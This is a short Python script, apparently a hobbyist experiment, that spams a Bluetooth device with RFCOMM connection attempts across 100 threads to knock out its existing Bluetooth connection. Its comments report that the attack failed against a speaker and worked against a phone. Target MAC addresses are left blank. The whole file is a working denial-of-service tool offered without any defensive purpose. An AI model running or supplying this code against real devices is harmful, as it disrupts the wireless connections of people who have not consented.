#testing spamming bluetooth connections to bluetooth devices to break its bluetooth connection
#spam speaker test: failed
#spam phone test: passed
import socket
import time
import threading

#Mac addresses removed for privacy and security reasons
serverMACAddress = '' #computer
#serverMACAddress = '' #phone
#serverMACAddress = '' #2945 (speaker)
#serverMACAddress = '' #Chrome led (speaker)

port = 4 #for computer
#port = 3
def spamConnections():
    while(1):
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            s.connect((serverMACAddress,port))
            print("connection was made")
        except Exception as e:
            pass


#used for spamming one connection at a time
#spamConnections()

#used for spamming multiple connections by using threads
for i in range(0,100):
    time.sleep(.1)
    thread = threading.Thread(target=spamConnections, args = ())
    thread.start()